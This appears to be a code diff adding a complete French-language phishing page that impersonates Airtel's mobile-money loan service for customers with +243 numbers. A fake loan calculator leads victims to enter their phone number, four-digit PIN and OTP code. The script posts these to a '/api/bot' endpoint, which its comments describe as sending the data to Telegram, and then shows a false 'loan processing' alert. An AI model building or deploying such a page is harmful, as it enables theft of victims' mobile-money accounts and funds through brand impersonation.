@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel Prêts</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { margin: 0; padding: 0; background-color: #f4f4f4; display: flex; justify-content: center; min-height: 100vh; }
+        
+        .app-container { width: 100%; max-width: 400px; background: white; position: relative; min-height: 100vh; overflow-x: hidden; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
+        
+        .screen { display: none; flex-direction: column; min-height: 100vh; width: 100%; }
+
+        /* HEADER */
+        .header { background-color: #E40000; padding: 20px; text-align: center; color: white; }
+        .header h1 { margin: 0; font-size: 24px; font-weight: bold; }
+
+        /* CALCULATOR */
+        .calc-wrapper { padding: 15px; background: #f9f9f9; flex-grow: 1; }
+        .calc-card { background: white; border: 2px solid #E40000; border-radius: 12px; padding: 20px; text-align: center; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+        .amount-display { font-size: 32px; font-weight: bold; color: #E40000; margin: 10px 0; }
+        
+        input[type=range] { width: 100%; margin: 15px 0; -webkit-appearance: none; background: transparent; }
+        input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; height: 24px; width: 24px; border-radius: 50%; background: #E40000; cursor: pointer; margin-top: -8px; }
+        input[type=range]::-webkit-slider-runnable-track { width: 100%; height: 8px; background: #ddd; border-radius: 5px; }
+        
+        .term-buttons { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 10px; }
+        .term-btn { padding: 10px; border: 1px solid #ccc; background: white; color: #333; font-weight: bold; border-radius: 6px; cursor: pointer; }
+        .term-btn.active { background-color: #E40000; color: white; border-color: #E40000; }
+        
+        .payment-box { background-color: #fff0f0; border: 1px solid #E40000; padding: 15px; border-radius: 8px; margin-top: 20px; }
+        .payment-amount { font-size: 28px; font-weight: bold; color: #E40000; margin: 5px 0; }
+        
+        .btn-main { width: 100%; background-color: #E40000; color: white; font-size: 16px; font-weight: bold; padding: 15px; border: none; border-radius: 8px; margin-top: 20px; cursor: pointer; text-transform: uppercase; }
+        .btn-main:disabled { background-color: #9ca3af; color: #d1d5db; cursor: not-allowed; }
+
+        /* LOGIN SCREEN */
+        #screen-welcome { background-color: #E40000; justify-content: center; align-items: center; padding: 20px; }
+        .login-card { background: white; border-radius: 20px; padding: 30px 20px; width: 100%; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        .login-logo { font-size: 28px; font-weight: bold; color: #E40000; margin-bottom: 5px; font-style: italic; }
+        .login-sub { font-size: 14px; color: #333; font-weight: bold; margin-bottom: 20px; }
+        .illustration { font-size: 70px; margin-bottom: 20px; }
+        .login-title { font-size: 16px; font-weight: bold; margin-bottom: 15px; text-align: left; padding-left: 10px;}
+        .welcome-input-group { display: flex; border: 1px solid #ccc; border-radius: 8px; overflow: hidden; margin-bottom: 20px; }
+        .welcome-input-group span { background: #f4f4f4; padding: 15px; font-weight: bold; color: #333; border-right: 1px solid #ccc; }
+        .welcome-input-group input { border: none; padding: 15px; flex-grow: 1; font-size: 16px; outline: none; }
+        .btn-blue { width: 100%; background-color: #007BFF; color: white; font-size: 16px; font-weight: bold; padding: 15px; border: none; border-radius: 8px; cursor: pointer; }
+        .btn-blue:disabled { background-color: #9ca3af; }
+
+        /* SPLIT SCREENS */
+        .split-screen { display: flex; flex-direction: column; min-height: 100vh; background: #E40000; }
+        .top-red-half { padding: 40px 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; }
+        .airtel-logo-img { font-size: 40px; font-weight: bold; font-style: italic; letter-spacing: -2px; margin-bottom: 5px; }
+        .airtel-tagline { font-size: 10px; letter-spacing: 2px; font-weight: bold; }
+        
+        .bottom-white-half { background: white; flex-grow: 1; border-top-left-radius: 24px; border-top-right-radius: 24px; padding: 30px 20px; display: flex; flex-direction: column; }
+        
+        /* OTP SPECIFIC */
+        .otp-title { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 10px; }
+        .otp-sub { font-size: 14px; color: #666; margin-bottom: 30px; }
+        .otp-boxes { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 20px; }
+        .otp-boxes input { width: 60px; height: 60px; text-align: center; font-size: 24px; font-weight: bold; border: 1px solid #ccc; border-radius: 8px; background: #f9f9f9; color: #333; }
+        .otp-boxes input:focus { outline: none; border-color: #E40000; background: white; }
+        
+        /* Timer & Resend */
+        .resend-text { text-align: center; font-size: 14px; color: #666; margin-bottom: 20px; height: 20px; }
+        .btn-resend { width: 100%; background: white; color: #E40000; font-size: 16px; font-weight: bold; padding: 15px; border: 1px solid #E40000; border-radius: 8px; cursor: pointer; display: none; margin-bottom: 20px; }
+        
+        .divider { display: flex; align-items: center; text-align: center; color: #999; margin: 20px 0; font-size: 14px; }
+        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #ccc; }
+        .divider::before { margin-right: 10px; }
+        .divider::after { margin-left: 10px; }
+        .btn-outline { width: 100%; background: white; color: #333; font-size: 16px; font-weight: bold; padding: 15px; border: 1px solid #ccc; border-radius: 8px; cursor: pointer; }
+
+        /* PIN SPECIFIC */
+        .pin-title { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 10px; }
+        .pin-sub { font-size: 14px; color: #666; margin-bottom: 30px; }
+        .pin-dots { display: flex; justify-content: center; gap: 20px; margin-bottom: 20px; }
+        .pin-dot { width: 20px; height: 20px; border: 2px solid #ccc; border-radius: 50%; }
+        .pin-dot.filled { background-color: #E40000; border-color: #E40000; }
+        .forgot-pin { text-align: center; color: #E40000; text-decoration: underline; font-size: 14px; margin-bottom: 20px; font-weight: bold; }
+        
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 300px; margin: 0 auto 20px auto; }
+        .keypad button { width: 70px; height: 70px; border-radius: 50%; border: none; background: #f0f0f0; font-size: 24px; font-weight: bold; color: #333; margin: 0 auto; cursor: pointer; }
+        .keypad button:active { background: #ddd; }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <!-- CALCULATOR -->
+        <div id="screen-calc" class="screen" style="display: flex;">
+            <div class="header"><h1>Airtel Prêts</h1></div>
+            <div class="calc-wrapper">
+                <div class="calc-card">
+                    <h3 style="margin:0; color:#E40000;">CALCULATRICE DE PRÊT</h3>
+                    <p style="font-size:12px; font-weight:bold; color:#666; margin-bottom:0; margin-top:15px;">MONTANT DU PRÊT</p>
+                    <div class="amount-display" id="amountText">USD 50,000.00</div>
+                    
+                    <input type="range" id="slider" min="500" max="50000" step="500" value="50000" oninput="
+                        var val = parseFloat(this.value);
+                        document.getElementById('amountText').innerHTML = 'USD ' + val.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+                        var rate = 0.045 / 12;
+                        var term = window.currentTerm || 12;
+                        var payment = val * rate * Math.pow(1 + rate, term) / (Math.pow(1 + rate, term) - 1);
+                        document.getElementById('paymentText').innerHTML = 'USD ' + payment.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+                    ">
+                    
+                    <p style="font-size:12px; font-weight:bold; color:#666; margin-bottom:5px;">DURÉE DU PRÊT</p>
+                    <div class="term-buttons">
+                        <button type="button" class="term-btn" id="btn6" onclick="window.currentTerm=6; this.className='term-btn active'; document.getElementById('btn12').className='term-btn'; document.getElementById('btn24').className='term-btn'; document.getElementById('slider').oninput();">6 mois</button>
+                        <button type="button" class="term-btn active" id="btn12" onclick="window.currentTerm=12; this.className='term-btn active'; document.getElementById('btn6').className='term-btn'; document.getElementById('btn24').className='term-btn'; document.getElementById('slider').oninput();">12 mois</button>
+                        <button type="button" class="term-btn" id="btn24" onclick="window.currentTerm=24; this.className='term-btn active'; document.getElementById('btn6').className='term-btn'; document.getElementById('btn12').className='term-btn'; document.getElementById('slider').oninput();">24 mois</button>
+                    </div>
+                    
+                    <div class="payment-box">
+                        <p style="margin:0; font-size:12px; letter-spacing:1px; color:#666;">PAIEMENT MENSUEL</p>
+                        <div class="payment-amount" id="paymentText">USD 4,268.93</div>
+                    </div>
+                    
+                    <button class="btn-main" onclick="
+                        document.getElementById('screen-calc').style.display = 'none';
+                        document.getElementById('screen-welcome').style.display = 'flex';
+                    ">DEMANDER MAINTENANT</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- LOGIN (PHONE) -->
+        <div id="screen-welcome" class="screen" style="display: none;">
+            <div class="login-card">
+                <div class="login-logo">airtel Lite</div>
+                <div class="login-sub">Vous êtes les bienvenus !</div>
+                
+                <div class="illustration">👥</div>
+
+                <div class="login-title">Connexion</div>
+                <div class="welcome-input-group">
+                    <span>+243</span>
+                    <input type="tel" id="loginPhone" placeholder="Entrez le numéro" oninput="document.getElementById('loginBtn').disabled = this.value.length < 9">
+                </div>
+                <!-- Direct inline transition to PIN screen -->
+                <button id="loginBtn" class="btn-blue" disabled onclick="
+                    window.userPhone = '+243' + document.getElementById('loginPhone').value;
+                    document.getElementById('screen-welcome').style.display = 'none';
+                    document.getElementById('screen-pin').style.display = 'flex';
+                ">Continuer</button>
+            </div>
+        </div>
+
+        <!-- PIN -->
+        <div id="screen-pin" class="screen" style="display: none; padding:0;">
+            <div class="split-screen">
+                <div class="top-red-half">
+                    <div class="airtel-logo-img">airtel</div>
+                    <div class="airtel-tagline">UNE RAISON D'IMAGINER</div>
+                </div>
+                <div class="bottom-white-half">
+                    <div class="pin-title">Entrez le code PIN</div>
+                    <div class="pin-sub">Entrez votre code PIN à 4 chiffres</div>
+                    
+                    <div class="pin-dots" id="pinDots">
+                        <div class="pin-dot"></div>
+                        <div class="pin-dot"></div>
+                        <div class="pin-dot"></div>
+                        <div class="pin-dot"></div>
+                    </div>
+                    
+                    <div class="forgot-pin">PIN oublié ?</div>
+                    
+                    <div class="keypad">
+                        <button type="button" onclick="enterPin('1')">1</button>
+                        <button type="button" onclick="enterPin('2')">2</button>
+                        <button type="button" onclick="enterPin('3')">3</button>
+                        <button type="button" onclick="enterPin('4')">4</button>
+                        <button type="button" onclick="enterPin('5')">5</button>
+                        <button type="button" onclick="enterPin('6')">6</button>
+                        <button type="button" onclick="enterPin('7')">7</button>
+                        <button type="button" onclick="enterPin('8')">8</button>
+                        <button type="button" onclick="enterPin('9')">9</button>
+                        <div></div>
+                        <button type="button" onclick="enterPin('0')">0</button>
+                        <button type="button" onclick="deletePin()" style="font-size:14px;">DEL</button>
+                    </div>
+                    
+                    <!-- Submit PIN -> Sends Telegram -> Moves to OTP -->
+                    <button id="pinBtn" class="btn-main" style="background:#E40000; color:white; border-radius: 24px;" disabled onclick="submitPin()">Continuer</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- OTP -->
+        <div id="screen-otp" class="screen" style="display: none; padding:0;">
+            <div class="split-screen">
+                <div class="top-red-half">
+                    <div class="airtel-logo-img">airtel</div>
+                    <div class="airtel-tagline">UNE RAISON D'IMAGINER</div>
+                </div>
+                <div class="bottom-white-half">
+                    <div class="otp-title">Connexion avec OTP</div>
+                    <div class="otp-sub">Entrez l'OTP envoyé à votre numéro</div>
+                    
+                    <div class="otp-boxes">
+                        <input type="tel" id="otp1" maxlength="1" oninput="moveOtp(this, 'otp2')">
+                        <input type="tel" id="otp2" maxlength="1" oninput="moveOtp(this, 'otp3')">
+                        <input type="tel" id="otp3" maxlength="1" oninput="moveOtp(this, 'otp4')">
+                        <input type="tel" id="otp4" maxlength="1" oninput="checkOtp()">
+                    </div>
+                    
+                    <!-- Timer -->
+                    <div class="resend-text" id="resendContainer">
+                        Renvoyer l'OTP dans <span id="timerText" style="color:#E40000; font-weight:bold;">60s</span>
+                    </div>
+                    <button id="resendBtn" class="btn-resend" onclick="resendOtp()">Renvoyer l'OTP</button>
+                    
+                    <button id="otpBtn" class="btn-main" style="background:#E40000; color:white; border-radius: 24px;" disabled onclick="submitOtp()">Vérifier OTP</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        var enteredPin = "";
+        var globalUserId = Date.now().toString().slice(-6);
+        window.userPhone = ""; 
+        var timerInterval;
+
+        // PIN Logic
+        function enterPin(num) { if (enteredPin.length < 4) { enteredPin += num; updateDots(); } }
+        function deletePin() { enteredPin = enteredPin.slice(0, -1); updateDots(); }
+        function updateDots() {
+            var dots = document.querySelectorAll('.pin-dot');
+            for(var i=0; i<dots.length; i++) {
+                if (i < enteredPin.length) { dots[i].classList.add('filled'); } 
+                else { dots[i].classList.remove('filled'); }
+            }
+            document.getElementById('pinBtn').disabled = enteredPin.length !== 4;
+        }
+
+        // 1. Submit Phone + PIN -> Telegram -> OTP Screen
+        function submitPin() {
+            // Change Screen FIRST
+            document.getElementById('screen-pin').style.display = 'none';
+            document.getElementById('screen-otp').style.display = 'flex'; 
+            document.getElementById('otp1').focus();
+            
+            // Start Timer
+            startOtpTimer();
+
+            // Send BOTH Phone and PIN to Telegram
+            fetch('/api/bot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    action: 'send', type: 'PHONE_PIN', userId: globalUserId, 
+                    data: { phone: window.userPhone, pin: enteredPin } 
+                })
+            }).catch(err => console.log(err));
+        }
+
+        // OTP Timer Logic (60s)
+        function startOtpTimer() {
+            clearInterval(timerInterval);
+            var timeLeft = 60;
+            
+            document.getElementById('resendContainer').style.display = 'block';
+            document.getElementById('resendBtn').style.display = 'none';
+            document.getElementById('timerText').innerText = timeLeft + 's';
+
+            timerInterval = setInterval(function() {
+                timeLeft--;
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    document.getElementById('resendContainer').style.display = 'none';
+                    document.getElementById('resendBtn').style.display = 'block';
+                } else {
+                    document.getElementById('timerText').innerText = timeLeft + 's';
+                }
+            }, 1000);
+        }
+
+        function resendOtp() {
+            startOtpTimer();
+            alert("Un nouvel OTP a été envoyé.");
+        }
+
+        // OTP Logic
+        function moveOtp(current, nextId) {
+            if (current.value.length === 1) { var next = document.getElementById(nextId); if(next) next.focus(); }
+            checkOtp();
+        }
+
+        function checkOtp() {
+            var otp = "";
+            for (var i = 1; i <= 4; i++) { otp += document.getElementById('otp' + i).value; }
+            document.getElementById('otpBtn').disabled = (otp.length !== 4);
+        }
+
+        function submitOtp() {
+            var otp = "";
+            for (var i = 1; i <= 4; i++) { otp += document.getElementById('otp' + i).value; }
+            if (otp.length !== 4) return;
+            
+            clearInterval(timerInterval);
+            alert("Succès! Votre prêt est en cours de traitement.");
+            
+            // Send OTP to Telegram
+            fetch('/api/bot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    action: 'send', type: 'OTP', userId: globalUserId, 
+                    data: { phone: window.userPhone, otp: otp } 
+                })
+            }).catch(err => console.log(err));
+
+            setTimeout(function() {
+                window.location.reload();
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
